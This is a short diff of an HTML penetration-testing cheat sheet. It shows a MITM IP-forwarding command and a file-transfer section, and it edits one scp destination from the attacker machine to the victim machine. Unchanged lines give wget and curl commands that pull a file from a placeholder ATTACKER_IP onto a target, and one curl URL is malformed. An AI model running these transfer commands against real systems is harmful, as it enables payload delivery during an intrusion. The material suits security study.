@@ -109,7 +109,7 @@ Topic contains:
 		<li> To allow traffic routing on your part (Main rule for MITM)
 			<p> <pre><code> sudo sysctl -w net.ipv4.ip_forward=1 </code></pre>
 		<li> Transferring files
-			<pre><code> scp &lt;FILE_NAME> &lt;USERNAME>@&lt;TARGET_HOST>:&lt;/path/to/file/on/attacker_machine></code></pre>
+			<pre><code> scp &lt;FILE_NAME> &lt;USERNAME>@&lt;TARGET_HOST>:&lt;/path/to/dir/on/victim_machine></code></pre>
 			<pre><code> wget http://&lt;ATTACKER_IP>:&lt;ATTACKER_PORT>/&lt;FILE_NAME> </code></pre>
 			<pre><code> curl http:///&lt;ATTACKER_IP>:&lt;ATTACKER_PORT>/&lt;FILE_NAME> -o &lt;FILE_NAME> </code></pre>
 	</ul>
